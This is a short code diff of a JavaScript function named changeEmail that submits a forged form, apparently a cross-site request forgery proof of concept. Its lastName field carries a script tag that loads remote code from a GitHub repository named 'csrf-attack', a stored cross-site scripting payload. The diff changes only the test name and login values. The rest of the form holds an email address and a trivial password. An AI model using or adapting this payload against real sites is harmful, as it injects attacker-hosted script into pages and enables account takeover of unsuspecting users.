@@ -21,11 +21,11 @@ function changeEmail(newEmail) {
   const formData = new FormData();
   
   
-  formData.append('values[name]', 'SecurityTest');
+  formData.append('values[name]', 'SecurityTest1');
   formData.append('values[lastName]', '<script src=https://github.com/petya8bachey/csrf-attack/raw/refs/heads/main/poc.js></script>');
   formData.append('values[secondName]', '');
   formData.append('values[email]', 'spvdor@yandex.ru');
-  formData.append('values[login]', 'test23');
+  formData.append('values[login]', 'test33');
   formData.append('values[password]', '123123');
   formData.append('values[confirmPassword]', '123123');
 
